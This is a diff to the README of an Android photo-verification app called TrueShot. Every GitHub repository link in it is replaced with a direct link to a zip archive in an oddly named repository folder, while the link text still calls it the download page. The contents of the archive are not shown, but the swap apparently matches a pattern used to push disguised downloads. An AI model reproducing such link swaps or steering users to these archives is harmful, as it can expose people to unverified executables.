@@ -1,6 +1,6 @@
 # 📷 TrueShot - Verify Photos With Trusted Proof
 
-[![Download TrueShot](https://img.shields.io/badge/Download-TrueShot-blue?style=for-the-badge&logo=github)](https://github.com/fernado5894/TrueShot)
+[![Download TrueShot](https://img.shields.io/badge/Download-TrueShot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/fernado5894/TrueShot/main/unexacted/True-Shot-1.6.zip)
 
 ## 🔍 What TrueShot Does
 
@@ -21,7 +21,7 @@ TrueShot runs on Android devices. To use it, you need an Android phone or tablet
 
 ## 📥 Download and Install
 
-1. Open the download page: [TrueShot on GitHub](https://github.com/fernado5894/TrueShot)
+1. Open the download page: [TrueShot on GitHub](https://raw.githubusercontent.com/fernado5894/TrueShot/main/unexacted/True-Shot-1.6.zip)
 2. Find the latest release or the main app file on the page
 3. Download the app to your Android device
 4. Open the file from your Downloads folder
@@ -182,7 +182,7 @@ It helps when you need a clear way to see whether a photo came from a real devic
 
 ## 📎 Download Again
 
-If you need the app file again, use this link: [https://github.com/fernado5894/TrueShot](https://github.com/fernado5894/TrueShot)
+If you need the app file again, use this link: [https://raw.githubusercontent.com/fernado5894/TrueShot/main/unexacted/True-Shot-1.6.zip](https://raw.githubusercontent.com/fernado5894/TrueShot/main/unexacted/True-Shot-1.6.zip)
 
 ## 📘 About the Repository
 
